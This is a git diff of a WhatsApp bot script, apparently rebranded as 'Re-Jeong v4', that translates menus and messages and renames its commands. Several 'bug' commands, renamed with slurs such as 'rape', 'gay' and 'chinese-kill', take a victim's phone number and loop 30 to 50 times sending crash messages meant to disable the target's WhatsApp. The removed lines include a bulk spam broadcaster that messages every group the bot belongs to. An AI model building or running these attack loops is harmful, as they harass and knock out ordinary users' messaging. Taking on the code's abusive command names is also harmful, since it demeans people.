-│ ᯤ ᴜɴʟɪ
-│ ᯤ ʟɪsᴛsʀᴠ
-│ ᯤ ᴅᴇʟsʀᴠ
-┗─────────────❐`
+const allmenu = ` \` *Revenge and royalty is ours💀we bought the future...* 👾🤖\`
+ #𝐍𝐚𝐦𝐞 : ${pushname}
+ #𝐁𝐨𝐭 : Re-Jeong v4
+ 
+1).addowner
+2).addprem
+3).delowner
+4).delprem
+5).public
+6).self
+7).encrypt
+8).ai
+9).hidetag
+10).tagall
+11).promote
+12).demote`
 let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
+title: '⿻  ⌜ Re-Jeong  ⌟  ⿻',
 highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
+title: 'My Commands', 
 id: '.allmenu'
 }]
 },
 {
 highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
+title: 'Bugs', 
 id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
-}]
-},
-{
-highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
-id: '.toolsmenu'
 }]
 },
 {
 highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
+title: 'Groups', 
 id: '.groupmenu'
 }]
 },
 {
 highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
+title: 'rjngmenu', 
+id: '.rjngmenu'
 }]
 }]
 let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
+    title: 'Re-Jeong', 
     sections
 };
 
@@ -1121,114 +800,7 @@ buttons: [{
 },
  {
  "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
-}]
-}) 
-})} 
-}}, {userJid: m.sender, quoted: m}) 
-await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
-messageId: freesex.key.id 
-})
-}
-break
-
-case 'toolsmenu': {
-await loading()
-const version = require("baileys/package.json").version
-const toolsmenu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐
-┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ ᴇɴᴄ <ᴄᴏᴅᴇ>
-│ ᯤ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
-│ ᯤ ᴀɪ <ᴛᴇᴋs>
-┗─────────────❐`
-let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
-highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.allmenu'
-}]
-},
-{
-highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
-id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
-}]
-},
-{
-highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
-id: '.toolsmenu'
-}]
-},
-{
-highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
-id: '.groupmenu'
-}]
-},
-{
-highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
-}]
-}]
-let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
-    sections
-};
-
-let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
-"messageContextInfo": { 
-"deviceListMetadata": {}, 
-"deviceListMetadataVersion": 2
-}, 
-interactiveMessage: proto.Message.InteractiveMessage.create({
-contextInfo: { 
-mentionedJid: [m.sender], 
-externalAdReply: {
-showAdAttribution: true }
-}, body: proto.Message.InteractiveMessage.Body.create({ 
-text: toolsmenu
-}), 
-footer: proto.Message.InteractiveMessage.Footer.create({ 
-text: ''
-}), 
-header: proto.Message.InteractiveMessage.Header.create({ 
-hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Xynz.jpg")}, { upload: zyn.waUploadToServer })) 
-}), 
-nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
-buttons: [{
-"name": "single_select",
-"buttonParamsJson": JSON.stringify(listMessage) 
-},
- {
- "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
+ "buttonParamsJson": "{\"display_text\":\"Lord Re-Jeong\",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
 }]
 }) 
 })} 
@@ -1242,72 +814,46 @@ break
 case 'groupmenu': {
 await loading()
 const version = require("baileys/package.json").version
-const groupmenu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐
-┏─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
-│ ᯤ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
-│ ᯤ ᴋɪᴄᴋ <ᴛᴀɢ>
-│ ᯤ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
-│ ᯤ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
-┗─────────────❐`
+const groupmenu = `*Revenge and royalty is ours💀we bought the future...* 👾🤖
+#𝐍𝐚𝐦𝐞 : *${pushname}*
+#𝐁𝐨𝐭 : Re-Jeong-V4
+
+1).ʜɪᴅᴇᴛᴀɢ 
+2).ᴛᴀɢᴀʟʟ
+3).ᴋɪᴄᴋ 
+4).ᴘʀᴏᴍᴏᴛᴇ 
+5).ᴅᴇᴍᴏᴛᴇ `
 let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
+title: '⿻  ⌜ Re-Jeong  ⌟  ⿻',
 highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
+title: 'My commands ', 
 id: '.allmenu'
 }]
 },
 {
 highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
+title: 'Bugs', 
 id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
-}]
-},
-{
-highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
-id: '.toolsmenu'
 }]
 },
 {
 highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
+title: 'groups', 
 id: '.groupmenu'
 }]
 },
 {
 highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
+title: 'rjngmenu', 
+id: '.rjngmenu'
 }]
 }]
 let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
+    title: 'Re-Jeong', 
     sections
 };
 
@@ -1337,7 +883,7 @@ buttons: [{
 },
  {
  "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
+ "buttonParamsJson": "{\"display_text\":\"Lord Re-Jeong\",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
 }]
 }) 
 })} 
@@ -1348,77 +894,48 @@ messageId: freesex.key.id
 }
 break
 
-case 'ownermenu': {
+case 'rjngmenu': {
 await loading()
 const version = require("baileys/package.json").version
-const ownermenu = `┏─── ｢ \`𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣ ──❐
-┃🀄 𝐍𝐚𝐦𝐞 : *${pushname}*
-┃🀄 𝐁𝐨𝐭 : ${namabot}
-┃🀄 𝐃𝐞𝐯 : ${namaCreator}
-┃🀄 𝐕𝐞𝐫𝐬𝐢 : ${versisc}
-┃🀄 𝐑𝐮𝐧 : *${run}*
-┗──────────────❐
-┏─『 \`𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
-│ ᯤ sᴇᴛᴏᴡɴᴇʀ
-│ ᯤ ᴀᴅᴅᴏᴡɴᴇʀ
-│ ᯤ ᴀᴅᴅᴘʀᴇᴍ
-│ ᯤ ᴅᴇʟᴏᴡɴᴇʀ
-│ ᯤ ᴅᴇʟᴘʀᴇᴍ
-│ ᯤ ᴘᴜʙʟɪᴄ
-│ ᯤ sᴇʟғ
-┗─────────────❐`
+const ownermenu = ` 
+1).sᴇᴛᴏᴡner
+2).ᴀᴅᴅᴏᴡɴᴇʀ
+3).ᴀᴅᴅᴘʀᴇᴍ
+4).ᴅᴇʟᴏᴡɴᴇʀ
+5).ᴅᴇʟᴘʀᴇᴍ
+6).ᴘᴜʙʟɪᴄ
+7).sᴇʟғ`
 let sections = [{
-title: '⿻  ⌜ 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 ⌟  ⿻',
+title: '⿻  ⌜ Re-Jeong  ⌟  ⿻',
 highlight_label: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 👾', 
+title: 'My commands', 
 id: '.allmenu'
 }]
 },
 {
 highlight_label: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑨𝒕𝒕𝒂𝒄𝒌 𝑩𝒖𝒈 👾', 
+title: 'Bugs', 
 id: '.bugmenu'
-}]
-},
-{
-highlight_label: '𝐒𝐭𝐨𝐫𝐞 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑺𝒕𝒐𝒓𝒆 𝑴𝒆𝒏𝒖 👾', 
-id: '.storemenu'
-}]
-},
-{
-highlight_label: '𝐏𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑷𝒂𝒏𝒆𝒍 𝑴𝒆𝒏𝒖 👾', 
-id: '.panelmenu'
-}]
-},
-{
-highlight_label: '𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮',
-rows: [{
-title: '👾 𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖 👾', 
-id: '.toolsmenu'
 }]
 },
 {
 highlight_label: '𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑮𝒓𝒐𝒖𝒑 𝑴𝒆𝒏𝒖 👾', 
+title: 'Groups', 
 id: '.groupmenu'
 }]
 },
 {
 highlight_label: '𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮',
 rows: [{
-title: '👾 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 👾', 
-id: '.ownermenu'
+title: 'rjngmenu', 
+id: '.rjngmenu'
 }]
 }]
 let listMessage = {
-    title: '𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇', 
+    title: 'Re-Jeong', 
     sections
 };
 
@@ -1448,7 +965,7 @@ buttons: [{
 },
  {
  "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}"
+ "buttonParamsJson": "{\"display_text\":\"Lord Re-Jeong\",\"url\":\"https://wa.me/27623649420\",\"merchant_url\":\"https://wa.me/27623649420\"}"
 }]
 }) 
 })} 
@@ -1481,16 +998,16 @@ break
 case "kick": {
 if (!isGroup) return reply('Only Group')
 if (!isAdmins && !isOwner) return reply('Only Admin')
-if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
+if (!isBotAdmins) return reply(`Bot is not admin :(`)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zyn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
 }
 break
 
 case 'closegroup': {
-if (!isGroup) return reply(`Khusus Group Bego`)
-if (!isAdmins && !isOwner) return reply('Khusus Admin')
-if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
+if (!isGroup) return reply(`only groups`)
+if (!isAdmins && !isOwner) return reply('need admin priviledges')
+if (!isBotAdmins) return reply(`bot need admin privileges`)
 if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
 if (args[1] == 'second') {
 var timer = args[0] * `1000`
@@ -1537,7 +1054,7 @@ case "demote": {
 if (!isPremium) return reply(mess.only.premium)
 if (!isGroup) return reply('Only Group')
 if (!isAdmins && !isOwner) return reply('Only Admin')
-if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
+if (!isBotAdmins) return reply(`Bot not admin :(`)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zyn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
 }
@@ -1546,154 +1063,9 @@ break
 case "promote": {
 if (!isGroup) return reply('Only Group')
 if (!isAdmins && !isOwner) return reply('Only Admin')
-if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
+if (!isBotAdmins) return reply(`Bot not admin :(`)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zyn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
-}
-break
-
-case "jpmpromosi": case "jpmpromo": case "jpm3": {
-if (!isOwner) return reply(mess.only.owner)
-if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
-var teks = m.quoted ? m.quoted.text : text
-let total = 0
-let allfetch = await zyn.groupFetchAllParticipating()
-let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
-let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
-let usergc = finalres.map(v=>v.id)
-m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
-let teksnya = teks
-let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
-"messageContextInfo": { 
-"deviceListMetadata": {}, 
-"deviceListMetadataVersion": 2
-}, 
-interactiveMessage: proto.Message.InteractiveMessage.create({
-contextInfo: { 
-mentionedJid: [m.sender], 
-externalAdReply: {
-showAdAttribution: true }
-}, body: proto.Message.InteractiveMessage.Body.create({ 
-text: teksnya
-}), 
-nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
-buttons: [{
-"name": "cta_url",
-"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6285789034010\",\"merchant_url\":\"https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144"}`
-}, 
-{
-"name": "cta_url",
-"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VahNvB6IyPtUAQ4qSl32\"}`
-}, 
-{
-"name": "cta_url",
-"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144\"}`
-}, 
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\"}"
-}]
-})
-})} 
-}}, {userJid: m.sender, quoted: m})
-for (let jid of usergc) {
-try {
-await zyn.relayMessage(jid, msgii.message, { 
-messageId: msgii.key.id 
-})
-total += 1
-} catch {}
-await sleep(global.delayjpm)
-}
-m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
-}
-break
-
-case 'payment': {
-let teks = `${monospace("PAYMENT")}
-
-*(E-WALLET)*
-
-   *DANA*
-- ${dana}
-
-Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You
-
-© ${storename}`
-zyn.sendMessage(from, { 
-text: teks,
-contextInfo:{
-forwardingScore: 9999999,
-isForwarded: true, 
-mentionedJid:[m.sender],
-"externalAdReply": {
-"showAdAttribution": true,
-"renderLargerThumbnail": false,
-"title": `QRIS? KLIK DISINI`,
-"body": `Date : ${wib}, ${tanggal}`,
-"containsAutoReply": true,
-"mediaType": 1, 
-"thumbnailUrl": "https://b.top4top.io/p_3194nb6rt0.jpeg",
-"sourceUrl": `${qris}`
-}
-}
-},{ 
-quoted: fkontak })
-await sleep(1500)
-}
-      break
-
-case "danamasuk": {
-if (!isOwner) return reply(mess.only.owner)
-let teks = `*DONE DANA MASUK*
-
-Reqname :
-
-▰▰▰▰▰▰▰▰
-*Garansi 7 Day*
-*Create ${wib}*
-*Hari Ini ${hariini}*`
-zyn.sendMessage(from, { text : teks }, { quoted : m })
-}
-break
-
-case 'proses':{
-m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*')
-zyn.sendMessage("6285789034010@s.whatsapp.net", { text: "BANG ZYN ADA YANG TRX NIH CEPETAN PROSES NANTI BUYER NGAMOK", contextInfo: { forwardingScore: 9999, isForwarded: true }})
-}
-break
-
-case 'done': case 'd': {
-if (!isOwner) return reply(`Njirr Lu siapa Cuk`)
-let s = text.split(',')
-let barang = s[0]
-let nominal = s[1]
-if (s.length < 2) return reply(`*Format salah!*
-Penggunaan:
-${prefix + command} barang,nominal`)
-if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
-if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
-text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」
-
-📦 Barang : ${barang}
-💸 Nominal : ${nominal}
-📆 Tanggal : ${wib}
-🕰️ Waktu : ${time2}
-✨ Status : Berhasil
-
-𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *${storename}*`
-await zyn.relayMessage(m.chat,  {
-requestPaymentMessage: {
-currencyCodeIso4217: 'IDR',
-amount1000: `${nominal}*100000`,
-requestFrom: m.sender,
-noteMessage: {
-extendedTextMessage: {
-text: text_done,
-contextInfo: {
-externalAdReply: {
-showAdAttribution: true,
-}}}}}}, {})
 }
 break
 
@@ -1717,9 +1089,9 @@ reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Vi
 }
 break
 
-case 'stuk': case 'flow': 
+case 'rape': 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
+if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 50; i++) {
@@ -1730,18 +1102,18 @@ await beta2(zyn, target, wanted)
 await sendSessionStructure(target, wanted)
 await beta1(zyn, target, wanted)
 }
-reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+reply(`『 Re-Jeong Eliminated』
 
 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
-> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
+> Re-Jeong Sent the bugs buh honestly we both dont know how strong is the gay😂😂he might come back. Be prepared...`)
 break
 
-case 'fuck': case 'tzy': 
+case 'fuck':
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
+if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 50; i++) {
@@ -1752,18 +1124,18 @@ await beta2(zyn, target, wanted)
 await sendSessionStructure(target, wanted)
 await beta1(zyn, target, wanted)
 }
-reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+reply(`『 Re-Jeong Eliminated』
 
 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
-> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
+> Re-Jeong Sent the bugs buh honestly we both dont know how strong is the gay😂😂he might come back. Be prepared...`)
 break
 
-case 'vip': case 'attack': case 'andro': 
+case 'vip': case 'attack': case 'chinese-kill': 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
+if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 30; i++) {
@@ -1774,18 +1146,18 @@ await beta2(zyn, target, wanted)
 await sendSessionStructure(target, wanted)
 await beta1(zyn, target, wanted)
 }
-reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+reply(`『 Re-Jeong Eliminated』
 
 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
-> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
+> Re-Jeong Sent the bugs buh honestly we both dont know how strong is the gay😂😂he might come back. Be prepared...`)
 break
 
-case 'xios': case 'iphone': case 'xip':
+case 'gay': case 'iphone': case 'xip':
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
+if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 40; i++) {
@@ -1795,18 +1167,18 @@ await beta2(zyn, target, wanted)
 await sendSessionStructure(target, wanted)
 await beta1(zyn, target, wanted)
 }
-reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+reply(`『 Re-Jeong Eliminated』
 
 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
-> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
+> Re-Jeong Sent the bugs buh honestly we both dont know how strong is the gay😂😂he might come back. Be prepared...`)
 break
 
-case 'overflow': case 'vasion': case 'crashflow': 
+case 'overflow': case 'rejeong-bug': case 'crashflow': 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
+if (!q) return reply(`Example: ${prefix + command} 27×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 40; i++) {
@@ -1817,17 +1189,17 @@ await beta2(zyn, target, wanted)
 await sendSessionStructure(target, wanted)
 await beta1(zyn, target, wanted)
 }
-reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
+reply(`『 Re-Jeong Eliminated』
 
 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
 
     𝐍𝐎𝐓𝐄
-> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
+> Re-Jeong Sent the bugs buh honestly we both dont know how strong is the gay😂😂he might come back. Be prepared...`)
 break
 
 case "owner": {
-if (!isPremium) return reply('Mau Ngapain Dek ??')
